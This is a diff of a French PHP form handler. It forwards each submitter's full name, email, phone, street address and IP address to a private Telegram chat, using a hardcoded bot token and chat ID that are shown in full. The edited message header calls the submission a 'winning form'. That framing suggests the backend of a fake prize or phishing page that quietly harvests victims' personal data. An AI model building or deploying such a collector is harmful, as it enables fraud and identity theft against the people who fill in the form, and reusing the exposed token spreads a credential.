@@ -2,21 +2,23 @@
 // =======================
 //  CONFIG TELEGRAM
 // =======================
-$botToken = "6295685387:AAHb6p_xt8yrrMP918_sLdGKy_7ITJZ5beE"; 
-$chatId   = "5061239044";
+$botToken = "6295685387:AAHb6p_xt8yrrMP918_sLdGKy_7ITJZ5beE"; // BOT TOKEN
+$chatId   = "5061239044"; // CHAT ID
 
 // =======================
-//  RÉCUPÉRATION FORMULAIRE
+//  TRAITEMENT FORMULAIRE
 // =======================
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     exit('Accès direct interdit.');
 }
 
+// Récupération sécurisée des champs
 $fullName = isset($_POST['fullName']) ? trim($_POST['fullName']) : '';
 $email    = isset($_POST['email'])    ? trim($_POST['email'])    : '';
 $phone    = isset($_POST['phone'])    ? trim($_POST['phone'])    : '';
 $address  = isset($_POST['address'])  ? trim($_POST['address'])  : '';
 
+// Vérification simple
 if ($fullName === '' || $email === '' || $phone === '' || $address === '') {
     exit('Formulaire incomplet.');
 }
@@ -24,12 +26,12 @@ if ($fullName === '' || $email === '' || $phone === '' || $address === '') {
 // =======================
 //  MESSAGE POUR TELEGRAM
 // =======================
-$message  = "🎁 *Nouveau Formulaire*\n\n";
-$message .= "*Nom complet:* $fullName\n";
-$message .= "*Email:* $email\n";
-$message .= "*Téléphone:* $phone\n";
-$message .= "*Adresse:* $address\n";
-$message .= "\n🌐 IP: ".$_SERVER['REMOTE_ADDR'];
+$message  = "🎁 *Nouveau formulaire gagnant*\n\n";
+$message .= "*Nom complet :* " . $fullName . "\n";
+$message .= "*Email :* " . $email . "\n";
+$message .= "*Téléphone :* " . $phone . "\n";
+$message .= "*Adresse complète :* " . $address . "\n";
+$message .= "\n🌐 IP: " . $_SERVER['REMOTE_ADDR'];
 
 // =======================
 //  ENVOI VERS TELEGRAM
@@ -39,7 +41,7 @@ $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 $data = [
     'chat_id'    => $chatId,
     'text'       => $message,
-    'parse_mode' => 'Markdown'
+    'parse_mode' => 'Markdown',
 ];
 
 $options = [
@@ -51,9 +53,12 @@ $options = [
     ]
 ];
 
-$context  = stream_context_create($options);
-$result   = file_get_contents($url, false, $context);
+$context = stream_context_create($options);
+$result  = file_get_contents($url, false, $context);
 
+// =======================
+//  PAGE DE CONFIRMATION
+// =======================
 ?>
 <!DOCTYPE html>
 <html lang="fr">
